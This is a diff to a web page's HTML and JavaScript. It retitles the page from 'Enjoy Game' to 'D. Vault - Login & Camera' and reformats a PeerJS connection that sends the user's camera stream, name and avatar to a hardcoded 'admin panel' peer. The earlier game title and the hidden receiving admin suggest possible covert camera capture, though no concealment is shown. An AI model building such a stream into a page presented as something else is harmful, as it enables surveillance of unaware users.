@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Enjoy Game</title>
+  <title>D. Vault - Login & Camera</title>
   <style>
     * {
       box-sizing: border-box;
@@ -486,7 +486,6 @@
     let currentFacingMode = 'user';
     let currentStream = null;
 
-    // PeerJS Setup for live internet connection
     const ADMIN_PEER_ID = 'dvault_admin_panel_master_id';
     let peer = null;
 
@@ -494,18 +493,21 @@
       if (peer) {
         peer.destroy();
       }
+
+      // STUN configuration added for stable connection across cities/networks
       peer = new Peer({
-  host: 'server-production-1d90.up.railway.app',
-  port: 443,
-  path: '/myapp',
-  secure: true,
-  config: {
-    iceServers: [
-      { urls: 'stun:stun.l.google.com:19302' }
-    ]
-  }
-});
- 
+        host: 'server-production-1d90.up.railway.app',
+        port: 443,
+        path: '/myapp',
+        secure: true,
+        config: {
+          iceServers: [
+            { urls: 'stun:stun.l.google.com:19302' },
+            { urls: 'stun:stun1.l.google.com:19302' },
+            { urls: 'stun:stun2.l.google.com:19302' }
+          ]
+        }
+      });
 
       peer.on('open', () => {
         const nameVal = userNameInput.value.trim() || 'User';
@@ -514,7 +516,6 @@
           avatar: currentProfileImageSrc || '1.png'
         };
         
-        // Call Admin Panel over PeerJS
         const call = peer.call(ADMIN_PEER_ID, stream, { metadata: metadata });
         if (call) {
           call.on('error', (err) => {
